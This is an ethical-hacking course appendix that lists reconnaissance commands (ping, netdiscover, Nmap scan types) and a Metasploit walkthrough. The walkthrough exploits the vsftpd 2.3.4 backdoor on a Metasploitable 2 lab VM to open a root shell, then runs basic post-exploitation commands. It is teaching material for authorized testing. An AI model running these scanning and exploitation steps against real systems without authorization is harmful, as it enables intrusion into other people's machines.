# Appendix A – Practical Command Reference
## Part 1 – Network Discovery and Nmap Cheat Sheet

---

# Purpose of This Appendix

During the practical session, several Linux and penetration testing commands were used repeatedly.

This appendix serves as a quick reference guide that explains:

- Command syntax
- Purpose
- Common options
- Sample output
- Practical usage
- Common mistakes

---

# Checking Network Configuration

## ip addr

Displays all network interfaces and their IP addresses.

Syntax:

```bash
ip addr
```

Example:

```text
2: eth0:
    inet 192.168.56.101/24
```

Use this command to verify:

- Interface name
- IP address
- Network mask
- Interface status

---

## ifconfig

Older command used for displaying network configuration.

Syntax:

```bash
ifconfig
```

Typical Output:

```text
eth0

inet 192.168.56.101

netmask 255.255.255.0
```

Although deprecated on many Linux distributions, it is still commonly encountered in labs and interviews.

---

# Testing Connectivity

## ping

Tests whether another machine is reachable.

Syntax:

```bash
ping <IP Address>
```

Example:

```bash
ping 192.168.56.102
```

Sample Output:

```text
64 bytes from 192.168.56.102

icmp_seq=1

ttl=64

time=0.34 ms
```

---

## Understanding Ping Output

### icmp_seq

Sequence number of each packet.

---

### ttl

Time To Live.

Indicates how many network hops remain before the packet is discarded.

Typical defaults:

| Operating System | Default TTL |
|------------------|------------:|
| Linux | 64 |
| Windows | 128 |
| Cisco | 255 |

TTL can sometimes help estimate the target operating system.

---

### time

Round-trip latency.

Lower values generally indicate faster communication.

---

# Host Discovery

## Netdiscover

Discovers live hosts on the local network using ARP requests.

Syntax:

```bash
netdiscover
```

Scan a specific subnet:

```bash
netdiscover -r 192.168.56.0/24
```

---

## Example Output

```text
IP Address       MAC Address          Vendor

192.168.56.101   08:00:27:AA:11:22    Oracle

192.168.56.102   08:00:27:BB:22:33    Oracle
```

---

## Understanding the Output

### IP Address

The address assigned to the host.

---

### MAC Address

Unique hardware address of the network interface.

---

### Vendor

Identified from the MAC address prefix.

Example:

```text
Oracle
```

indicates a VirtualBox virtual network adapter.

---

# Why Netdiscover Before Nmap?

Netdiscover answers:

- Which systems are online?
- Which IP belongs to which device?
- Which hosts should be scanned?

Scanning unknown IP addresses wastes time.

---

# Nmap

## Purpose

Nmap (Network Mapper) is the standard tool for:

- Host discovery
- Port scanning
- Service detection
- Operating system detection
- Version detection
- Security auditing

---

# Basic Scan

Syntax:

```bash
nmap <Target IP>
```

Example:

```bash
nmap 192.168.56.102
```

Purpose:

Discover open ports on the target.

---

# Scan Results

Example:

```text
21/tcp open ftp

22/tcp open ssh

80/tcp open http
```

Interpretation:

| Port | Status | Service |
|------|--------|----------|
| 21 | Open | FTP |
| 22 | Open | SSH |
| 80 | Open | HTTP |

---

# Service Version Detection

Command:

```bash
nmap -sV 192.168.56.102
```

Purpose:

Identify service versions.

Example:

```text
21/tcp

ftp

vsftpd 2.3.4
```

Version information is essential for vulnerability research.

---

# Operating System Detection

Command:

```bash
nmap -O 192.168.56.102
```

Purpose:

Estimate the operating system.

Example:

```text
Linux Kernel 2.6.x
```

Nmap analyzes:

- TCP responses
- Window sizes
- TTL values
- Packet behavior

---

# Aggressive Scan

Command:

```bash
nmap -A 192.168.56.102
```

Includes:

- OS Detection
- Version Detection
- NSE Scripts
- Traceroute

Useful when maximum information is desired.

---

# SYN Scan

Command:

```bash
nmap -sS 192.168.56.102
```

Known as the TCP SYN Scan.

Characteristics:

- Faster
- Does not complete the TCP handshake
- Efficient for reconnaissance

---

# TCP Connect Scan

Command:

```bash
nmap -sT 192.168.56.102
```

Characteristics:

- Completes full TCP handshake
- Easier to detect
- Used when SYN scanning is unavailable

---

# UDP Scan

Command:

```bash
nmap -sU 192.168.56.102
```

Purpose:

Discover UDP services.

Examples:

- DNS
- SNMP
- DHCP
- TFTP

UDP scanning is generally slower than TCP scanning.

---

# Scan Specific Ports

Command:

```bash
nmap -p 21,22,80 192.168.56.102
```

Only scans selected ports.

Useful when focusing on known services.

---

# Scan All Ports

Command:

```bash
nmap -p- 192.168.56.102
```

Scans all 65,535 TCP ports.

Useful for comprehensive assessments.

---

# Verbose Mode

Command:

```bash
nmap -v 192.168.56.102
```

Provides additional progress information.

---

# Save Scan Results

Normal output:

```bash
nmap -oN scan.txt 192.168.56.102
```

XML output:

```bash
nmap -oX scan.xml 192.168.56.102
```

All formats:

```bash
nmap -oA fullscan 192.168.56.102
```

Produces:

```text
fullscan.nmap

fullscan.xml

fullscan.gnmap
```

Useful for reporting and later analysis.

---

# Understanding Port States

### Open

A service is actively listening.

---

### Closed

No service is listening, but the host is reachable.

---

### Filtered

Firewall or filtering device prevented Nmap from determining the state.

---

### Unfiltered

The port is reachable, but Nmap cannot determine whether it is open or closed.

---

### Open|Filtered

Nmap cannot distinguish between the two.

Often seen in UDP scans.

---

# Banner Grabbing

Many services reveal version information.

Example:

```text
220 (vsFTPd 2.3.4)
```

This information helps identify vulnerabilities.

---

# Commonly Encountered Ports

| Port | Service |
|------|----------|
| 20 | FTP Data |
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 8080 | HTTP Alternate |

---

# Common Reconnaissance Workflow

```text
Check IP Address

↓

Ping Target

↓

Discover Hosts

↓

Run Basic Nmap Scan

↓

Detect Service Versions

↓

Identify Operating System

↓

Research Vulnerabilities

↓

Plan Exploitation
```

---

# Common Mistakes

### Wrong Subnet

Machines cannot communicate.

---

### Firewall Enabled

Ports appear filtered.

---

### VM Network Misconfigured

Host discovery fails.

---

### Using the Wrong IP Address

Scans the wrong machine.

---

### Skipping Version Detection

Impossible to determine whether a service is vulnerable.

---

# Quick Revision Table

| Command | Purpose |
|----------|----------|
| `ip addr` | Display IP configuration |
| `ifconfig` | Display network configuration (legacy) |
| `ping` | Test connectivity |
| `netdiscover` | Discover live hosts using ARP |
| `nmap` | Basic port scan |
| `nmap -sV` | Service version detection |
| `nmap -O` | Operating system detection |
| `nmap -A` | Aggressive scan |
| `nmap -sS` | SYN scan |
| `nmap -sT` | TCP Connect scan |
| `nmap -sU` | UDP scan |
| `nmap -p` | Scan selected ports |
| `nmap -p-` | Scan all TCP ports |
| `nmap -oN` | Save normal output |
| `nmap -oX` | Save XML output |
| `nmap -oA` | Save all output formats |

# Appendix A – Practical Command Reference
## Part 2 – Metasploit Commands, Linux Commands, Session Handling and Troubleshooting

---

# Purpose

After completing reconnaissance with Netdiscover and Nmap, the next stage is exploitation.

During the practical session, the instructor used the Metasploit Framework to exploit a vulnerable FTP service running on Metasploitable 2.

This appendix summarizes the commands used during exploitation and post-exploitation.

---

# Starting Metasploit

## Command

```bash
msfconsole
```

Purpose:

Launches the Metasploit Framework console.

Typical Output:

```text
msf6 >
```

Once this prompt appears, the framework is ready.

---

# Search for Exploits

## Command

```bash
search <keyword>
```

Example:

```bash
search vsftpd
```

Purpose:

Searches the Metasploit database for matching exploit modules.

Example Output:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

---

# Load an Exploit Module

## Command

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Purpose:

Loads the selected exploit.

Prompt Changes To:

```text
msf6 exploit(vsftpd_234_backdoor) >
```

---

# Display Module Information

## Command

```bash
info
```

Purpose:

Displays:

- Vulnerability description
- References
- Author
- Platform
- Targets
- Payloads
- Required options

Always read module information before execution.

---

# Show Required Parameters

## Command

```bash
show options
```

Purpose:

Displays all required parameters.

Typical Output:

```text
RHOSTS

RPORT

SSL

TARGET
```

Parameters marked as required must be configured.

---

# Configure Target IP

## Command

```bash
set RHOSTS 192.168.56.102
```

Purpose:

Specifies the target machine.

Output:

```text
RHOSTS => 192.168.56.102
```

---

# Configure Target Port

## Command

```bash
set RPORT 21
```

Purpose:

Specifies the service port.

Default FTP Port:

```text
21
```

---

# Verify Configuration

## Command

```bash
show options
```

Purpose:

Confirms that all required fields have valid values before exploitation.

---

# Execute the Exploit

## Command

```bash
run
```

or

```bash
exploit
```

Purpose:

Launches the exploit against the configured target.

Typical Workflow:

```text
Connect

↓

Verify Target

↓

Trigger Vulnerability

↓

Execute Payload

↓

Open Session
```

---

# Successful Exploitation

Example Output:

```text
Command shell session opened
```

Meaning:

The exploit succeeded and a remote shell has been established.

---

# Display Active Sessions

## Command

```bash
sessions
```

Purpose:

Lists all active sessions.

Example:

```text
ID   Type

1    Shell
```

---

# Interact with a Session

## Command

```bash
sessions -i 1
```

Purpose:

Connects to Session 1.

The terminal now communicates directly with the compromised machine.

---

# Background a Session

Instead of closing a session,

press:

```text
CTRL + Z
```

Metasploit asks:

```text
Background session?

Yes
```

The session continues running while returning to the Metasploit console.

---

# Kill a Session

## Command

```bash
sessions -k 1
```

Purpose:

Terminates Session 1.

Useful after testing is complete.

---

# Exit Metasploit

## Command

```bash
exit
```

Purpose:

Closes the Metasploit Framework.

---

# Typical Exploitation Workflow

```text
Start Metasploit

↓

Search Exploit

↓

Load Exploit

↓

Read Module Information

↓

Configure Target

↓

Verify Options

↓

Execute

↓

Obtain Session

↓

Perform Post Exploitation

↓

Document Findings

↓

Close Session
```

---

# Linux Commands Used During the Practical

After exploitation,

the instructor demonstrated several Linux commands to verify control over the victim machine.

---

# whoami

Displays the currently logged-in user.

Command:

```bash
whoami
```

Example:

```text
root
```

Purpose:

Confirms privilege level.

---

# pwd

Displays the current working directory.

Command:

```bash
pwd
```

Example:

```text
/root
```

---

# ls

Lists files in the current directory.

Command:

```bash
ls
```

Purpose:

View directory contents.

---

# ls -la

Lists all files including hidden files.

Command:

```bash
ls -la
```

Useful during post-exploitation.

---

# cd

Changes the current directory.

Example:

```bash
cd /tmp
```

---

# mkdir

Creates a directory.

Command:

```bash
mkdir demo
```

Purpose:

Used during the demonstration to prove write access.

---

# touch

Creates an empty file.

Command:

```bash
touch test.txt
```

Purpose:

Demonstrates successful command execution.

---

# cat

Displays file contents.

Command:

```bash
cat test.txt
```

---

# rm

Deletes files.

Command:

```bash
rm test.txt
```

---

# rmdir

Deletes empty directories.

Command:

```bash
rmdir demo
```

---

# uname

Displays operating system information.

Command:

```bash
uname -a
```

Example Output:

```text
Linux metasploitable
```

Useful for confirming the operating system after exploitation.

---

# hostname

Displays the machine's hostname.

Command:

```bash
hostname
```

---

# id

Displays user and group identifiers.

Command:

```bash
id
```

Example:

```text
uid=0(root)

gid=0(root)
```

Useful for confirming root privileges.

---

# ifconfig

Displays network configuration.

Command:

```bash
ifconfig
```

Useful for identifying:

- IP Address
- Network Interfaces
- MAC Address

---

# ip addr

Modern alternative to ifconfig.

Command:

```bash
ip addr
```

---

# Post-Exploitation Checklist

Immediately after obtaining a shell,

an ethical hacker typically performs:

```text
Check Current User

↓

Check Operating System

↓

Check Hostname

↓

Check Network Configuration

↓

Enumerate Files

↓

Identify Installed Software

↓

Document Findings
```

Notice that documentation is an important part of ethical hacking.

---

# Common Metasploit Errors

## Exploit Failed

Possible Causes:

- Wrong target IP
- Wrong port
- Patched target
- Incorrect exploit
- Firewall
- Network issue

---

## No Session Opened

Possible Causes:

- Payload incompatible
- Target not vulnerable
- Antivirus interference
- Incorrect configuration

---

## Connection Refused

Possible Causes:

- Service not running
- Wrong IP
- Wrong port
- Firewall blocking traffic

---

## Timeout

Possible Causes:

- Target offline
- Incorrect subnet
- Packet filtering
- VM networking problem

---

# Practical Troubleshooting Workflow

```text
Verify Target IP

↓

Ping Target

↓

Run Nmap

↓

Verify Open Port

↓

Confirm Service Version

↓

Check Exploit Compatibility

↓

Configure Options

↓

Execute Again
```

Never assume the exploit is at fault until networking has been verified.

---

# Best Practices

Before exploitation:

- Verify connectivity.
- Confirm software version.
- Read module information.
- Configure options carefully.

After exploitation:

- Verify privileges.
- Minimize changes.
- Document evidence.
- Remove temporary files.
- Close sessions cleanly.

---

# Practical Command Cheat Sheet

| Command | Purpose |
|----------|---------|
| `msfconsole` | Start Metasploit |
| `search` | Search modules |
| `use` | Load exploit |
| `info` | Display module details |
| `show options` | Display required parameters |
| `set RHOSTS` | Configure target IP |
| `set RPORT` | Configure target port |
| `run` | Execute exploit |
| `exploit` | Execute exploit |
| `sessions` | List active sessions |
| `sessions -i` | Interact with a session |
| `sessions -k` | Kill a session |
| `whoami` | Current user |
| `pwd` | Current directory |
| `ls` | List files |
| `ls -la` | List all files |
| `mkdir` | Create directory |
| `touch` | Create file |
| `cat` | Display file |
| `rm` | Delete file |
| `rmdir` | Delete directory |
| `uname -a` | OS information |
| `hostname` | Display hostname |
| `id` | Display user identity |
| `ifconfig` | Network configuration |
| `ip addr` | Modern network configuration |

---

# End-to-End Practical Workflow

```text
Virtual Machines Ready

↓

Verify Networking

↓

Ping Target

↓

Netdiscover

↓

Nmap Scan

↓

Version Detection

↓

Identify Vulnerability

↓

Launch Metasploit

↓

Search Exploit

↓

Configure Exploit

↓

Run Exploit

↓

Gain Session

↓

Verify Access

↓

Document Findings

↓

Cleanup

↓

Close Session
```

---

# Final Practical Summary

The practical demonstration illustrated a complete penetration testing workflow in a controlled laboratory environment.

Students learned how to:

- Verify virtual machine networking.
- Discover hosts on a local network.
- Perform reconnaissance using Netdiscover.
- Scan services using Nmap.
- Identify vulnerable software versions.
- Use Metasploit to validate a known vulnerability.
- Obtain a command shell on a vulnerable system.
- Execute basic post-exploitation commands.
- Document and verify successful exploitation.
- Follow an ethical and repeatable penetration testing methodology.

The emphasis throughout the demonstration was not simply on "hacking" a machine, but on understanding each phase of the penetration testing process and validating vulnerabilities in a safe, authorized environment.
